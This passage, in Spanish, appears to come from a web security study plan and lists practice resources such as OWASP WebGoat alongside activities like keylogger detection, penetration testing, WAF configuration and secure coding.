- OWASP WebGoat para práctica
- Laboratorios de vulnerabilidades web
- Herramientas de testing automatizado

## Actividades
- Detección de keyloggers en sistemas
- Exploración de OWASP Top 10
- Web application penetration testing
- Configuración de WAF
- Desarrollo de código seguro
